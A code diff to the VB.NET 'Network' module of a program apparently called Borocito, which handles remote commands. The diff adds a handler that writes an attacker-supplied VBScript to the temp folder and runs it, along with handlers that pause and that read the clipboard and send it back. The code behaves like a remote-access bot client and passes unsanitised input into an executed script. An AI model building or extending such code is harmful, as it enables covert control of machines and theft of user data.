@@ -486,8 +486,15 @@ Module Network
                         End If
                         If CMD1.Contains("MsgBox=") Then
                             Dim Arg() As String = CommandCMD.Split(",")
-                            MsgBox(Arg(0), MsgBoxStyle.Information, Arg(1))
-                            CommandResponse = "Mensaje ejecutado!: " & CMD1
+                            If My.Computer.FileSystem.FileExists(DIRTemp & "\MessageBoxBRO.vbs") Then
+                                My.Computer.FileSystem.DeleteFile(DIRTemp & "\MessageBoxBRO.vbs")
+                            End If
+                            My.Computer.FileSystem.WriteAllText(DIRTemp & "\MessageBoxBRO.vbs", "a = MsgBox(" & """" & Arg(0) & """" & "," & Arg(1) & "," & """" & Arg(2) & """" & ")", False, Encoding.ASCII)
+                            Process.Start(DIRTemp & "\MessageBoxBRO.vbs")
+
+                        ElseIf CMD1 = "/Pause=" Then
+                            SendCommandResponse("Borocito has been to pause for '" & CommandCMD & "' ms")
+                            Threading.Thread.Sleep(CommandCMD)
 
                         ElseIf CMD1 = "/Memory.Save()" Then
                             SaveRegedit()
@@ -550,7 +557,7 @@ Module Network
                             End Try
 
                         ElseIf CMD1.Contains("/Windows.Clipboard.Get()") Then 'No funciona
-                            CommandResponse = My.Computer.Clipboard.GetText
+                            CommandResponse = My.Computer.Clipboard.GetText()
 
                         ElseIf CMD1.Contains("/Windows.System.GetHost()") Then 'Funciona.
                             tempString = vbCrLf
